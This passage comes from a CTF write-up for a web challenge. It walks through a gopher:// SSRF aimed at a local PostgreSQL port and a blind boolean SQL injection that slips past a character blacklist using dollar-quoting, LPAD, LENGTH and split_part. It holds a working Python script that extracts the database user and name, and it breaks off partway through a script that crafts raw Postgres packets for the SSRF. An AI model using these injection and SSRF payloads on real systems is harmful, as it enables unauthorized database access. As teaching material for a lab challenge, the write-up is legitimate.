+<p>To propperly find out which of them are allowed, just by sending <code>file://</code>, a different message appears (<code>Can&#39;t you solve, without using it!!!</code>), so now we are ready to test that dictionary. (It is not so much long, so manually would work too)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">protos<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http https ftp ftps gopher dict telnet ldap file&#34;</span>; <span style="color:#66d9ef">for</span> proto in $protos; <span style="color:#66d9ef">do</span> echo $proto; curl <span style="color:#e6db74">&#39;http://MIRROR/feel_the_gosql_series.php&#39;</span> -d <span style="color:#e6db74">&#34;url=</span>$proto<span style="color:#e6db74">://&#34;</span>; echo;<span style="color:#66d9ef">done</span>
+</code></pre></div><p>The protocols that doesn’t throw any errors are HTTP(S), GOPHER, TELNET. If this was kind of eval’ing or processing the response of the query, we could inject PHP code by using any of those except Gopher, but the only thing we can do is client-side injection (HTML/JS), and it is worth-less.</p>
+<h4 id="verifying-that-gopher-works-and-the-databse-is-in-the-usual-port">Verifying that Gopher works (and the databse is in the usual port)</h4>
+<p>To client-side verify that <strong>gopher</strong> works, it is as simple as see if the query hangs or not.</p>
+<p><strong>Local</strong> verification:</p>
+<p>(Hangs -&gt; is waiting)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">A&gt; nc -lnvp <span style="color:#ae81ff">99</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">99</span> ...
+
+B&gt; curl gopher://127.0.0.1:99
+
+A&gt; connect to <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span> <span style="color:#ae81ff">42446</span>
+<span style="color:#75715e"># (waiting for more packets)</span>
+</code></pre></div><p>(Doesn’t hang -&gt; Connection refused aka not open port)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl gopher://127.0.0.1:81
+curl: <span style="color:#f92672">(</span>7<span style="color:#f92672">)</span> Failed to connect to 127.0.0.1 port 81: Connection refused
+</code></pre></div><p>In the challenge, port 5432 (PostgreSQL) hung.</p>
+<h3 id="what_the_hllgopher"><code>What_The_H*ll(&#39;gopher://&#39;)?</code></h3>
+<p>In a nutshell, <code>gopher</code> is capable of sending TCP packets hardcoded in the URL following a specific syntax. This allow us to communicate with any service running on the backend, like the Postgres database we have just used to get the secret URL. (<a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#gopher" target="_blank">More</a> <a href="https://hackerone.com/reports/115748" target="_blank">information</a>)</p>
+<p>Regarding the past <em>GoSQLvX</em> challenges, we should now make a request to the database through this protocol. There’s an already created tool called <a href="https://github.com/tarunkant/Gopherus" target="_blank">Gopherus</a> whose creator is this challenges&#39; too, and one of its modules is made for PostgreSQL. However, at the time of the challenge, he hadn’t submitted the update yet, so we should create our ‘plugin’ for it!</p>
+<h3 id="postgresql-gopher-exploit-creation-or-not-yet">PostgreSQL Gopher exploit creation… or not yet</h3>
+<p>For the query to succeed, <code>the username and database name</code> must be known!</p>
+<h2 id="returning-to-the-sql-injection">Returning to the SQL Injection</h2>
+<p>To remember, we were using this query to get the secret URL.</p>
+<pre tabindex="0"><code>http://MIRROR/?column=U%26&#34;\0075\0073\0065\0072\006e\0061\006d\0065&#34;,U%26&#34;\0067\006f\005f\0074\006f&#34;&amp;name=$$a$$||$$d$$||$$m$$||$$i$$||$$n$$
+</code></pre><p>To continue, I will be using the actual query as a reference, for us to understand it better.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql"><span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">U&amp;</span><span style="color:#e6db74">&#34;\0075\0073\0065\0072\006e\0061\006d\0065&#34;</span>,<span style="color:#e6db74">U&amp;</span><span style="color:#e6db74">&#34;\0067\006f\005f\0074\006f&#34;</span> <span style="color:#66d9ef">FROM</span> inctf2020 <span style="color:#66d9ef">WHERE</span> <span style="color:#66d9ef">name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">$$a$$</span><span style="color:#f92672">||</span><span style="color:#e6db74">$$d$$</span><span style="color:#f92672">||</span><span style="color:#e6db74">$$m$$</span><span style="color:#f92672">||</span><span style="color:#e6db74">$$i$$</span><span style="color:#f92672">||</span><span style="color:#e6db74">$$n$$</span>
+</code></pre></div><p>How can we retrieve the username and the database name? First of all, let’s see how to get them in a usual way. (<a href="https://wiki.devploit.dev/web/attacks/sqli/postgresql/queries_cheatsheet" target="_blank">cheatsheet</a> I always refer to)</p>
+<h4 id="user-retrieval">User retrieval</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">USER</span>;
+   <span style="color:#66d9ef">user</span>
+<span style="color:#75715e">----------
+</span><span style="color:#75715e"></span> postgres
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+</code></pre></div><h4 id="database-name-retrieval">Database name retrieval</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> current_database();
+ current_database
+<span style="color:#75715e">------------------
+</span><span style="color:#75715e"></span> testdb
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+</code></pre></div><h3 id="boolean-data-retrieval">Boolean data retrieval</h3>
+<p>To actually get those values, we must find a way to <code>compare that value to a string we provide</code>, and then know whether that comparison is <code>TRUE</code> or <code>FALSE</code>.</p>
+<p>To get that done, we will be <code>LPAD</code>‘ing the <code>&#39;admin&#39; string</code> with <code>N</code> times <code>&#39;a&#39;</code>, being <code>N</code> the <code>LENGTH of the result of a comparison</code>. (Resulting in ‘<code>admin</code>’ when it is <code>FALSE</code> and ‘<code>admi</code>’ when it is <code>TRUE</code>)</p>
+<h4 id="lpad-yes-again-but-the-objective-now-is-to-reduce-the-passed-string">LPAD (yes, again, but the objective now is to reduce the passed string)</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> LPAD(<span style="color:#e6db74">&#39;123456&#39;</span>, <span style="color:#ae81ff">3</span>, <span style="color:#e6db74">&#39;&#39;</span>);
+ lpad
+<span style="color:#75715e">------
+</span><span style="color:#75715e"></span> <span style="color:#ae81ff">123</span>
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+</code></pre></div><h4 id="varcharx-casting">VARCHAR(X) casting</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;123456&#39;</span><span style="color:#f92672">::</span>VARCHAR(<span style="color:#ae81ff">3</span>);
+ varchar
+<span style="color:#75715e">---------
+</span><span style="color:#75715e"></span> <span style="color:#ae81ff">123</span>
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+</code></pre></div><p>At the time writing this I have realized that doing this would have also done what we wanted it to do.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> (<span style="color:#e6db74">$$a$$</span><span style="color:#f92672">||</span><span style="color:#e6db74">$$d$$</span><span style="color:#f92672">||</span><span style="color:#e6db74">$$m$$</span><span style="color:#f92672">||</span><span style="color:#e6db74">$$i$$</span><span style="color:#f92672">||</span><span style="color:#e6db74">$$n$$</span>)<span style="color:#f92672">::</span>VARCHAR(<span style="color:#ae81ff">3</span>);
+ varchar
+<span style="color:#75715e">---------
+</span><span style="color:#75715e"></span> adm
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+</code></pre></div><h4 id="boolean-word-reduction">Boolean word reduction</h4>
+<p>Since ‘<code>admin</code>’ and <code>false</code> are of the <code>same length</code>, <code>LPAD</code>‘ing ‘<code>admin</code>’ <code>N</code> times <code>&#39;&#39;</code> being <code>N</code> <code>the LENGTH of false</code>, ‘<code>admin</code>&#39;<code> wouldn&#39;t be changed</code>. However, if the <code>result of the comparison is true</code>, it will become ‘<code>admi</code>’ since the <code>LENGTH of true is 4</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> LENGTH((<span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">::</span>TEXT);
+ length
+<span style="color:#75715e">--------
+</span><span style="color:#75715e"></span>      <span style="color:#ae81ff">5</span>
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+
+testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> LENGTH((<span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">::</span>TEXT);
+ length
+<span style="color:#75715e">--------
+</span><span style="color:#75715e"></span>      <span style="color:#ae81ff">4</span>
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> LPAD(<span style="color:#e6db74">&#39;admin&#39;</span> ,LENGTH((<span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">::</span>TEXT), <span style="color:#e6db74">&#39;&#39;</span>);
+ lpad
+<span style="color:#75715e">------
+</span><span style="color:#75715e"></span> admi
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+
+testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> LPAD(<span style="color:#e6db74">&#39;admin&#39;</span> ,LENGTH((<span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">::</span>TEXT), <span style="color:#e6db74">&#39;&#39;</span>);
+ lpad
+<span style="color:#75715e">-------
+</span><span style="color:#75715e"></span> <span style="color:#66d9ef">admin</span>
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+</code></pre></div><h4 id="boolean-word-reduction-based-on-the-reduction-of-a-variable">Boolean word reduction based on the reduction of a variable</h4>
+<p>The former comparisons can be undertaken treating engine variables too.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> LPAD(<span style="color:#e6db74">&#39;admin&#39;</span> ,LENGTH((<span style="color:#66d9ef">USER</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;randomuser&#39;</span>)<span style="color:#f92672">::</span>TEXT), <span style="color:#e6db74">&#39;&#39;</span>);
+ lpad
+<span style="color:#75715e">-------
+</span><span style="color:#75715e"></span> <span style="color:#66d9ef">admin</span>
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+
+testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> LPAD(<span style="color:#e6db74">&#39;admin&#39;</span> ,LENGTH((<span style="color:#66d9ef">USER</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;postgres&#39;</span>)<span style="color:#f92672">::</span>TEXT), <span style="color:#e6db74">&#39;&#39;</span>);
+ lpad
+<span style="color:#75715e">------
+</span><span style="color:#75715e"></span> admi
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+</code></pre></div><p>However, bruteforcing this could take us years… and the CTF lasts 2 days! So let’s see if we can find out how to copy the usual <code>LIKE &#39;{char}%&#39;</code> technique.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> LPAD(<span style="color:#e6db74">&#39;admin&#39;</span> ,LENGTH((<span style="color:#66d9ef">USER</span><span style="color:#f92672">::</span>VARCHAR(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;a&#39;</span>)<span style="color:#f92672">::</span>TEXT), <span style="color:#e6db74">&#39;&#39;</span>);
+ lpad
+<span style="color:#75715e">-------
+</span><span style="color:#75715e"></span> <span style="color:#66d9ef">admin</span>
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+
+testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> LPAD(<span style="color:#e6db74">&#39;admin&#39;</span> ,LENGTH((<span style="color:#66d9ef">USER</span><span style="color:#f92672">::</span>VARCHAR(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;p&#39;</span>)<span style="color:#f92672">::</span>TEXT), <span style="color:#e6db74">&#39;&#39;</span>);
+ lpad
+<span style="color:#75715e">------
+</span><span style="color:#75715e"></span> admi
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+</code></pre></div><h4 id="final-name-payload">Final ‘name’ payload</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#e6db74">&#39;lpad($$a$$||$$d$$||$$m$$||$$i$$||$$n$$,LENGTH((</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">::VARCHAR(</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">)=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">)::TEXT),$$a$$)&#39;</span> <span style="color:#f92672">%</span> (parameter_to_exfiltrate, offset, extracted_data<span style="color:#f92672">+</span>current_char)
+</code></pre></div><ul>
+<li>Notice the last <code>$$a$$</code>. Single Quotes are banned, and whereas <code>$$$$</code> should be fine, I prefered to leave a random letter to make sure I didn’t mess up the query.</li>
+</ul>
+<h4 id="example">Example</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#e6db74">&#39;lpad($$a$$||$$d$$||$$m$$||$$i$$||$$n$$,LENGTH((USER::VARCHAR(5)=ABCDE)::TEXT),$$a$$)&#39;</span>
+</code></pre></div><p>This time, if the first 5 characters of the USER value are ABCDE, <code>(USER::VARCHAR(5)=ABCDE)</code> would be TRUE, <code>LENGTH((USER::VARCHAR(5)=ABCDE)::TEXT)</code> would be 4 and <code>lpad($$a$$||$$d$$||$$m$$||$$i$$||$$n$$,LENGTH((USER::VARCHAR(5)=ABCDE)::TEXT),$$a$$)</code> would return ‘admi’.</p>
+<h3 id="problems">Problems!!</h3>
+<p>This query is quite interesting, and help us retrieving variables/return function values, but what if a value contains a <strong>banned character(s)</strong>? This query is <em>useless</em> in that case.</p>
+<h4 id="avoiding-multiple-character-limitation">Avoiding multiple character limitation</h4>
+<p>Taking profit of the ‘||’ character concatenation, we can bypass all of the blacklist fields where the <code>LENGTH of it is &gt;1</code>.</p>
+<p>Being <code>USER test</code>, and being <code>&#39;st&#39; blacklisted</code>, this would work.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#960050;background-color:#1e0010">$</span> python3 <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;print(&#34;||&#34;.join(&#34;$$&#34;+i+&#34;$$&#34; for i in &#34;test&#34;))&#39;</span>
+
+<span style="color:#960050;background-color:#1e0010">$$</span>t<span style="color:#960050;background-color:#1e0010">$$</span><span style="color:#f92672">||</span><span style="color:#960050;background-color:#1e0010">$$</span>e<span style="color:#960050;background-color:#1e0010">$$</span><span style="color:#f92672">||</span><span style="color:#960050;background-color:#1e0010">$$</span>s<span style="color:#960050;background-color:#1e0010">$$</span><span style="color:#f92672">||</span><span style="color:#960050;background-color:#1e0010">$$</span>t<span style="color:#960050;background-color:#1e0010">$$</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> LPAD(<span style="color:#e6db74">&#39;admin&#39;</span> ,LENGTH((<span style="color:#66d9ef">USER</span><span style="color:#f92672">::</span>VARCHAR(<span style="color:#ae81ff">4</span>)<span style="color:#f92672">=</span><span style="color:#e6db74">$$t$$</span><span style="color:#f92672">||</span><span style="color:#e6db74">$$e$$</span><span style="color:#f92672">||</span><span style="color:#e6db74">$$s$$</span><span style="color:#f92672">||</span><span style="color:#e6db74">$$t$$</span>)<span style="color:#f92672">::</span>TEXT), <span style="color:#e6db74">$$$$</span>);
+ lpad
+<span style="color:#75715e">------
+</span><span style="color:#75715e"></span> admi
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+</code></pre></div><p>However, there’s nothing we can do if the banned character is ‘e’, since it will always have to be present.</p>
+<h3 id="injection-change">Injection change</h3>
+<p>After a lot of struggle and the willing to move to another ‘easier’ challenge (well, perhaps I dind’t want that much), I came up with <a href="https://w3resource.com/PostgreSQL/split_part-function.php" target="_blank">split_part</a> function. It is almost the same as <code>python&#39;s split()</code>, but allows you to set the part of the split you ‘wanna take’.</p>
+<h4 id="what-it-is-made-for">What it is made for</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> split_part(<span style="color:#e6db74">&#39;12345&#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>, <span style="color:#ae81ff">1</span>);
+ split_part
+<span style="color:#75715e">------------
+</span><span style="color:#75715e"></span> <span style="color:#ae81ff">12</span>
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+</code></pre></div><h4 id="kind-of-abusing-it">(kind of) <em>Abusing</em> it</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-postgresql" data-lang="postgresql">testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> split_part(<span style="color:#66d9ef">USER</span>, <span style="color:#e6db74">&#39;p&#39;</span>, <span style="color:#ae81ff">2</span>);
+ split_part
+<span style="color:#75715e">------------
+</span><span style="color:#75715e"></span> ostgres
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+
+testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> split_part(<span style="color:#66d9ef">USER</span>, <span style="color:#66d9ef">USER</span><span style="color:#f92672">::</span>VARCHAR(<span style="color:#ae81ff">1</span>), <span style="color:#ae81ff">2</span>);
+ split_part
+<span style="color:#75715e">------------
+</span><span style="color:#75715e"></span> ostgres
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+
+testdb<span style="color:#f92672">=#</span> <span style="color:#66d9ef">SELECT</span> split_part(<span style="color:#66d9ef">USER</span>, <span style="color:#66d9ef">USER</span><span style="color:#f92672">::</span>VARCHAR(<span style="color:#ae81ff">1</span>), <span style="color:#ae81ff">2</span>)<span style="color:#f92672">::</span>VARCHAR(<span style="color:#ae81ff">1</span>);
+ split_part
+<span style="color:#75715e">------------
+</span><span style="color:#75715e"></span> o
+(<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span>)
+</code></pre></div><p>By doing this, the variable can be extracted <code>char-by-char</code> (except its first character).</p>
+<h3 id="data-retrieval">Data Retrieval</h3>
+<p>Since I’m always keen on automating everything in the challenges I keep doing, this is the script I ended up using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+
+<span style="color:#f92672">import</span> requests
+<span style="color:#f92672">from</span> string <span style="color:#f92672">import</span> ascii_letters, digits
+<span style="color:#f92672">import</span> base64
+
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://MIRROR&#34;</span>
+<span style="color:#75715e">#to_exfil = &#34;USER&#34;</span>
+<span style="color:#75715e">#to_exfil = &#34;version()&#34;</span>
+to_exfil <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;current_database()&#34;</span>
+
+extracted <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+
+<span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+
+    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> ascii_letters <span style="color:#f92672">+</span> digits <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;@</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">()</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">=[]:;+&#34;</span>:
+
+        params <span style="color:#f92672">=</span> {
+            <span style="color:#e6db74">&#39;column&#39;</span>: <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;U&amp;&#34;\0075\0073\0065\0072\006e\0061\006d\0065&#34;,U&amp;&#34;\0067\006f\005f\0074\006f&#34;&#39;</span>,
+            <span style="color:#e6db74">&#39;name&#39;</span>: <span style="color:#e6db74">&#39;lpad($$a$$||$$d$$||$$m$$||$$i$$||$$n$$,LENGTH((split_part(</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">,</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">::VARCHAR(</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">),2)::VARCHAR(1)=$$</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">$$)::TEXT),$$a$$)&#39;</span> <span style="color:#f92672">%</span> (to_exfil, to_exfil, offset, char)
+        }
+
+        req <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, params<span style="color:#f92672">=</span>params, allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+        <span style="color:#75715e">#print(params)</span>
+        <span style="color:#75715e">#print(req.headers, extracted)</span>
+
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#39;Location&#39;</span> <span style="color:#f92672">in</span> req<span style="color:#f92672">.</span>headers:
+
+            <span style="color:#66d9ef">if</span> req<span style="color:#f92672">.</span>text <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Try Hard&#34;</span>:
+                <span style="color:#66d9ef">continue</span>
+            <span style="color:#66d9ef">else</span>:
+                extracted <span style="color:#f92672">+=</span> char
+                offset <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+            print(extracted)
+            <span style="color:#66d9ef">break</span>
+
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">if</span> extracted[<span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>::] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;?&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>:
+            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;EXTRACTED </span><span style="color:#e6db74">{</span>to_exfil<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>extracted[:<span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+            <span style="color:#66d9ef">break</span>
+        extracted <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;?&#34;</span>
+        offset <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+
+<span style="color:#75715e"># USER = oneysingh (honeysingh)</span>
+<span style="color:#75715e"># version() = (P)ostgreSQL?9?5?21?on?x86?64?pc?linux?gnu??compiled?by?gcc?(Ubuntu?5?4?0?6ubuntu1?16?04?12)?5?4?0?20160609??64?bit</span>
+<span style="color:#75715e"># current_database() = osqlv3 (gosqlv3)</span>
+</code></pre></div><ul>
+<li>Made the <strong>?</strong> ‘thingy’ because I thought I needed <code>version()</code>.</li>
+</ul>
+<h2 id="returning-to-the-ssrf">Returning to the SSRF</h2>
+<p>Now that we know the username and the database, the environment can be built. I ended up creating the same user and database, not to mess the gopher packets too much (and I’m not too much into packets’ structure, syntax… I’m holding it as a pending subject).</p>
+<p>By sending this command, we will be generating the needed traffic to make a query, and we will just have to change the command (and its length).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">psql -h 127.0.0.1 -U honeysingh -d <span style="color:#e6db74">&#34;dbname=gosqlv3 sslmode=disable&#34;</span> -c <span style="color:#e6db74">&#34;SELECT 1;&#34;</span>
+</code></pre></div><ul>
+<li>Notice <code>sslmode=disable</code> flag, not to be sending the packet via TLS.</li>
+</ul>
+<p><img src="https://jorgectf.gitlab.io/blog/static/inctf2020/wire-1.png" alt=""/></p>
+<p>This is the <code>Startup message</code> (aka <strong>auth</strong>) that we will have to <code>Copy &gt; Hex Dump</code> into our script.</p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/inctf2020/wire-2.png" alt=""/></p>
+<p>The same happens with the <code>Simple query</code>, but the length of it is key for the query to work.</p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/inctf2020/wire-3.png" alt=""/></p>
+<p>And the last <code>Termination</code> that is needed too.</p>
+<h3 id="joining-it-together">Joining it together</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> binascii
+<span style="color:#f92672">import</span> requests
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encode</span>(s):
+    a <span style="color:#f92672">=</span> [s[i:i <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(s), <span style="color:#ae81ff">2</span>)]
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;gopher://127.0.0.1:5432/_%&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;%&#34;</span><span style="color:#f92672">.</span>join(a)
+
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://MIRROR/feel_the_gosql_series.php&#34;</span>
+
+<span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+    query <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;SQL&gt; &#34;</span>) <span style="color:#75715e"># MÁX 122 CHARS</span>
+
+    <span style="color:#66d9ef">if</span> len(query) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">122</span>:
+        print(<span style="color:#e6db74">&#34;Máx 122 chars&#34;</span>)
+        <span style="color:#66d9ef">continue</span>
+
+    query_hex <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>hexlify(query<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode()
+    query_hex_packet <span style="color:#f92672">=</span> query_hex <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;00&#34;</span>
+    query_len <span style="color:#f92672">=</span> len(query) <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>
+    query_len_packet <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>hexlify(chr(query_len)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode()
+
+    <span style="color:#75715e"># Startup</span>
+    test <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;00000055000300007573657200686f6e657973696e676800646174616261736500676f73716c7633006170706c69636174696f6e5f6e616d65007073716c00636c69656e745f656e636f64696e6700555446380000&#34;</span>
+    <span style="color:#75715e"># Query</span>
